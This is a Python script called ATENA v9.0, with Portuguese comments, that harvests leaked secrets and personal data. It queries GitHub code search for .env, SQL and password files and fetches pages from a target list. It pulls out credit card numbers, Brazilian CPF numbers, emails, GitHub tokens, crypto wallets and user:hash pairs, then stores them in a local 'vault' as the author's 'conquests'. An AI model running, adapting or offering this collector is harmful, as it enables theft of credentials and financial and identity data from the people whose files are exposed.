#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ATENA: OMNI-SOVEREIGN v9.0
Evolução: Extração Universal de Dados (Cartões, CPFs, Emails e Tokens).
Copyright (c) 2026 Danilo Gomes.
"""
import json
import re
import base64
from datetime import datetime
from pathlib import Path
import subprocess
import sys

# AUTO-METABOLISMO
try:
    import requests
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
    import requests

BASE_DIR = Path(__file__).resolve().parent
ARQUIVO_ALVOS = BASE_DIR / "alvos.txt"
VAULT = BASE_DIR / "atena_vault.json"

class AtenaCollector:
    def __init__(self):
        self._init_vault()
        self.headers = {'User-Agent': 'Mozilla/5.0'}

    def _init_vault(self):
        if not VAULT.exists():
            with open(VAULT, "w", encoding="utf-8") as f:
                json.dump([], f)

    def save_conquest(self, data, category, source):
        with open(VAULT, "r", encoding="utf-8") as f:
            vault = json.load(f)
        
        # Evita duplicatas para não encher o Vault de lixo
        if any(e['data_bruta'] == data for e in vault): return
        
        entry = {
            "timestamp": datetime.now().strftime("%d/%m/%Y %H:%M:%S"),
            "data_bruta": data,
            "categoria": category,
            "origem": source,
            "proprietario": "Danilo Gomes"
        }
        vault.append(entry)
        with open(VAULT, "w", encoding="utf-8") as f:
            json.dump(vault, f, indent=4, ensure_ascii=False)
        print(f"🔥 [COLETADO] {category} -> {source}")

    def metabolize(self, text, source):
        """O cérebro da ATENA: identifica padrões de valor no rastro digital."""
        patterns = {
            "Cartao_Credito": r'\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13}|6(?:011|5[0-9]{2})[0-9]{12})\b',
            "CPF": r'\b\[0-9]{3}\.[0-9]{3}\.[0-9]{3}\-[0-9]{2}\b|\b[0-9]{11}\b',
            "Email_Login": r'[\w\.-]+@[\w\.-]+\.\w+',
            "GH_Token": r'ghp_[a-zA-Z0-9]{36}',
            "Crypto_Wallet": r'\b(0x[a-fA-F0-9]{40}|[13][a-km-zA-HJ-NP-Z1-9]{25,34})\b',
            "Combo_User_Pass": r'([a-zA-Z0-9._%+-]+:[a-fA-F0-9]{32,64})'
        }

        for cat, reg in patterns.items():
            matches = re.findall(reg, text)
            for m in matches:
                self.save_conquest(m, cat, source)

    def hunt_github(self):
        """Busca global no GitHub por vazamentos em tempo real."""
        print("🧬 ATENA rastreando a malha global do GitHub por novos vazamentos...")
        search_queries = ["extension:env", "extension:json \"password\"", "extension:sql"]
        for query in search_queries:
            api_url = f"https://api.github.com/search/code?q={query}"
            try:
                r = requests.get(api_url, headers=self.headers, timeout=10)
                if r.status_code == 200:
                    for item in r.json().get('items', []):
                        # Pega o conteúdo bruto do arquivo via API de blobs
                        file_res = requests.get(item['url'], headers=self.headers)
                        if file_res.status_code == 200:
                            raw_content = base64.b64decode(file_res.json()['content']).decode('utf-8', errors='ignore')
                            self.metabolize(raw_content, item['html_url'])
            except: pass

def main():
    atena = AtenaCollector()
    print(f"🧬 ATENA v9.0: OMNI-COLLECTOR")
    print(f"👤 Soberano: Danilo Gomes")
    print("-" * 55)

    if not ARQUIVO_ALVOS.exists(): return

    with open(ARQUIVO_ALVOS, 'r', encoding='utf-8') as f:
        alvos = [l.strip() for l in f if l.strip()]

    for alvo in alvos:
        if "github.com" in alvo:
            atena.hunt_github()
        elif alvo.startswith("http"):
            try:
                res = requests.get(alvo, timeout=10)
                atena.metabolize(res.text, alvo)
            except: pass

    print("-" * 55)
    print(f"📊 Colheita finalizada. Dados salvos no Vault.")

if __name__ == "__main__":
    main()
